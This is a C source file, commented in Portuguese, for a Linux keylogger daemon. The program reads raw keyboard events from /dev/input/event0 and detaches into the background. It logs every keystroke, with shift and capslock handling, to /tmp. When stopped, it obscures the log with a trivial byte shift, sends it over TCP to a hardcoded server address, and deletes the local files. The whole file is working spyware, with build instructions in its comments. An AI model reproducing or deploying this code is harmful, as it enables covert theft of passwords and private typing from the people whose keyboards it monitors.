#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>
#include <errno.h>
#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <syslog.h>
#include <signal.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

//sudo apt-get install libx11-dev
//gcc -o keyDaemon keyDaemon.c -lX11 -lXext
//ps aux | grep keylogger_daemon
//sudo kill -15 <PID_DO_DAEMON>

#define TRUE 1
#define FALSE 0

#define LOGFILE "/tmp/keylogger.log"
#define ENCRYPTEDFILE "/tmp/encrypt.log"
#define KEYBOARD_DEVICE "/dev/input/event0"

volatile sig_atomic_t stop = 0;

#define PORT 65535
#define SERVER "192.168.0.123"
#define BUFF_SIZE 1024

//Função auxiliar para manipulação de sinal (utilizado para finalizar o daemon)
void handle_signal(int sig) {
    if (sig == SIGTERM) {
        stop = 1;
    }
}

//Função auxiliar para fazer o processo rodar em segundo plano
void daemonize() {
    pid_t pid, sid;

    // Cria um novo processo
    pid = fork();

    // Se o fork falhar, o processo pai sai com erro
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    // Se for o processo pai, sai
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // A partir daqui, estamos no processo filho (daemon)
    umask(0);

    // Cria uma nova sessão para se desvincular do terminal de controle
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }

    // Muda o diretório de trabalho para a raiz
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }
}

// Função auxiliar para detectar o estado do Caps Lock
int is_capslock_active(){
    Display *d = XOpenDisplay(NULL);
    if (d == NULL) {
        fprintf(stderr, "Erro ao abrir display X\n");
        exit(EXIT_FAILURE);
    }
    XkbStateRec xkbState;
    XkbGetState(d, XkbUseCoreKbd, &xkbState);
    int capslock = (xkbState.locked_mods & LockMask) != 0;
    XCloseDisplay(d);
    printf("tecla capslock está %d\n", capslock);
    return capslock;
}

//Função auxiliar para mandar o conteúdo do keylog para o servidor
void send_to_server() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BUFF_SIZE] = {0};
    FILE *log_file;

    // Criando o socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Erro: falha na criação do socket\n");
        exit(EXIT_FAILURE);
    }

    //Configurando o socket
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    //Transformado IP string em binário
    if(inet_pton(AF_INET, SERVER, &serv_addr.sin_addr) <= 0) {
        printf("Erro: endereço IP inválido ou não suportado\n");
        exit(EXIT_FAILURE);
    }

    //Conectando com o servidor
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("Erro: falha na conexão com o servidor\n");
        exit(EXIT_FAILURE);
    }

    //Abrindo o arquivo de log encriptado
    log_file = fopen(ENCRYPTEDFILE, "r");
    if (log_file == NULL) {
        perror("Erro ao abrir o arquivo de log");
        close(sock);
        exit(EXIT_FAILURE);
    }

    //Lendo o arquivo de log encriptado e enviando via socket
    while (fgets(buffer, sizeof(buffer), log_file) != NULL) {
        //Envia o conteúdo do log encriptado ao servidor
        send(sock, buffer, strlen(buffer), 0);
    }

    // Fecha o arquivo de log encriptado e o socket
    fclose(log_file);
    close(sock);
}

//Função auxiliar para criptografar os dados do log antes de enviar ao servidor
void encrypt() {
    FILE *fin, *fout;
    int i,n;
    char buffer[BUFF_SIZE];
    fin = fopen(LOGFILE,"r");
    if(fin == NULL){
        printf("%s file does not exist\n", LOGFILE);
        exit(EXIT_FAILURE);
    }
    fout = fopen(ENCRYPTEDFILE,"w");
    if(fout == NULL){
        perror("Cannot create the file\n");
        exit(EXIT_FAILURE);
    }
    while(fgets(buffer,sizeof(buffer),fin)!=0){
        n = strlen(buffer);
        for(i=0; i<n; i++){
            buffer[i] = buffer[i] - 45;
        }
        fputs(buffer,fout);
    }
    fclose(fin);
    fclose(fout);
}

int main(int argc, char **argv) {
    struct input_event ev;
    char *map =            "..1234567890-=..qwertyuiop....asdfghjkl.....zxcvbnm,.;...";
    char *map_shift =      "..!@#$%.&*()_+..QWERTYUIOP....ASDFGHJKL.....ZXCVBNM<>;...";
    char *map_caps =       "..1234567890-=..QWERTYUIOP....ASDFGHJKL.....ZXCVBNM,.;...";
    char *map_caps_shift = "..!@#$%.&*()_+..qwertyuiop....asdfghjkl.....zxcvbnm<>;...";

    // Abre o dispositivo de teclado
    int fd = open(KEYBOARD_DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Erro ao abrir dispositivo de entrada");
        exit(EXIT_FAILURE);
    }

    // Abre o arquivo de log para armazenar as teclas pressionadas
    FILE *fp = fopen(LOGFILE, "a");
    if (fp == NULL) {
        perror("Erro ao abrir arquivo de log");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Inicializa o daemon
    daemonize();

    // Configura o manipulador de sinal para SIGTERM
    signal(SIGTERM, handle_signal);

    int est_shift_e = 0;
    int est_shift_d = 0;
    int est_capslock = 0;//= is_capslock_active();

    //shift esquerdo = 42, capslock = 58, shift direito = 54

    while(!stop) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            // shift pressionado -> ativado!
            if (ev.value == 1) {
                if(ev.code == 42) {
                    est_shift_e = 1;
                    fprintf(fp, "tecla número: %d = shift esq ajustado para %d\n", ev.value, est_shift_e);
                }
                else if(ev.code == 54) {
                    est_shift_d = 1;
                    fprintf(fp, "tecla número: %d = shift dir ajustado para %d\n", ev.value, est_shift_d);
                }
            }
            // shit solto -> desativado!
            else if (ev.value == 0) {
                fprintf(fp, "tecla número: %d = ", ev.code);
                if(ev.code == 42) {
                    est_shift_e = 0;
                    fprintf(fp, "shift esq ajustado para %d\n", est_shift_e);
                }
                else if(ev.code == 54) {
                    est_shift_d = 0;
                    fprintf(fp, "shift dir ajustado para %d\n", est_shift_d);
                }
            }

            if(ev.value == 0) {
                // a tecla foi solta
                if(ev.code == 58) { //caso de alternar o capslock
                    est_capslock = !est_capslock;
                    fprintf(fp, "capslock ajustada para %d\n", est_capslock);
                }
                //shift e caps desativado (map)
                else if(est_shift_e == 0 && est_shift_d == 0 && est_capslock == 0) {
                    switch (ev.code){
                        case 26:
                            fprintf(fp, "´");
                        break;

                        case 27:
                            fprintf(fp, "[");
                        break;

                        case 28:
                            fprintf(fp, "\n");
                        break;

                        case 41:
                            fprintf(fp, "'");
                        break;

                        case 43:
                            fprintf(fp, "]");
                        break;

                        case 40:
                            fprintf(fp, "~");
                        break;

                        case 53:
                            fprintf(fp, ";");
                        break;

                        case 57:
                           fprintf(fp, " ");
                        break;

                        case 89:
                            fprintf(fp, "/");
                        break;

                        case 103:
                            fprintf(fp, "seta para cima");
                        break;

                        case 105:
                            fprintf(fp, "seta para esquerda");
                        break;

                        case 106:
                            fprintf(fp, "seta para direita");
                        break;

                        case 108:
                            fprintf(fp, "seta para baixo");
                        break;

                        case 86:
                            fprintf(fp, "\\");
                        break;

                        case 39:
                            fprintf(fp, "ç");
                        break;

                        default:
                            fprintf(fp, "%c", map[ev.code]);
                    }
                }

                //casos com shift ativo (inclui caps ativo ou não)
                else if(est_shift_e == 1 || est_shift_d == 1) {
                    //shift e capslock ativos (map_caps_shift)
                    if(est_capslock == 1) {
                        switch (ev.code){
                            case 7:
                                fprintf(fp, "¨");
                            break;

                            case 26:
                                fprintf(fp, "`");
                            break;

                            case 27:
                                fprintf(fp, "{");
                            break;

                            case 28:
                                fprintf(fp, "\n");
                            break;

                            case 41:
                                fprintf(fp, "\"");
                            break;

                            case 43:
                                fprintf(fp, "}");
                            break;

                            case 40:
                                fprintf(fp, "^");
                            break;

                            case 53:
                                fprintf(fp, ":");
                            break;

                            case 57:
                               fprintf(fp, " ");
                            break;

                            case 89:
                                fprintf(fp, "?");
                            break;

                            case 103:
                                fprintf(fp, "seta para cima");
                            break;

                            case 105:
                                fprintf(fp, "seta para esquerda");
                            break;

                            case 106:
                                fprintf(fp, "seta para direita");
                            break;

                            case 108:
                                fprintf(fp, "seta para baixo");
                            break;

                            case 86:
                                fprintf(fp, "|");
                            break;

                            case 39:
                                fprintf(fp, "ç");
                            break;

                            default:
                                fprintf(fp, "%c", map_caps_shift[ev.code]);
                        }
                    }
                    //apenas shift ativo (map_shift)
                    else {
                        switch (ev.code){
                            case 7:
                                fprintf(fp, "¨");
                            break;

                            case 8:
                               fprintf(fp, "&");
                            break;

                            case 26:
                                fprintf(fp, "`");
                            break;

                            case 27:
                                fprintf(fp, "{");
                            break;

                            case 28:
                                fprintf(fp, "\n");
                            break;

                            case 41:
                                fprintf(fp, "\"");
                            break;

                            case 43:
                                fprintf(fp, "}");
                            break;

                            case 40:
                                fprintf(fp, "^");
                            break;

                            case 53:
                               fprintf(fp, ":");
                            break;

                            case 57:
                               fprintf(fp, " ");
                            break;

                            case 89:
                                fprintf(fp, "?");
                            break;

                            case 103:
                                fprintf(fp, "seta para cima");
                            break;

                            case 105:
                                fprintf(fp, "seta para esquerda");
                            break;

                            case 106:
                                fprintf(fp, "seta para direita");
                            break;

                            case 108:
                                fprintf(fp, "seta para baixo");
                            break;

                            case 86:
                                fprintf(fp, "|");
                            break;

                            case 39:
                                fprintf(fp, "Ç");
                            break;

                            default:
                                fprintf(fp, "%c", map_shift[ev.code]);
                        }
                    }
                }

                //apenas capslock ativo (map_caps)
                else {
                    switch (ev.code){
                        case 26:
                            fprintf(fp, "´");
                        break;

                        case 27:
                            fprintf(fp, "[");
                        break;

                        case 28:
                            fprintf(fp, "\n");
                        break;

                        case 41:
                            fprintf(fp, "'");
                        break;

                        case 43:
                            fprintf(fp, "]");
                        break;

                        case 40:
                            fprintf(fp, "~");
                        break;

                        case 53:
                            fprintf(fp, ";");
                        break;

                        case 57:
                           fprintf(fp, " ");
                        break;

                        case 89:
                            fprintf(fp, "/");
                        break;

                        case 103:
                            fprintf(fp, "seta para cima");
                        break;

                        case 105:
                            fprintf(fp, "seta para esquerda");
                        break;

                        case 106:
                            fprintf(fp, "seta para direita");
                        break;

                        case 108:
                            fprintf(fp, "seta para baixo");
                        break;

                        case 86:
                            fprintf(fp, "\\");
                        break;

                        case 39:
                            fprintf(fp, "Ç");
                        break;

                        default:
                            fprintf(fp, "%c", map_caps[ev.code]);
                    }
                }
                fflush(fp);
                fprintf(fp, "\n");
                fflush(fp);
            }
        }
    }

    //Fecha o arquivo após término da captura
    fclose(fp);

    // Encripta o log
    encrypt();

    // Envia log encriptado para o servidor
    send_to_server();

    // Fecha o descritor do teclado
    close(fd);

    // Apaga os arquivos log
    remove(LOGFILE);
    remove(ENCRYPTEDFILE);

    return 0;
}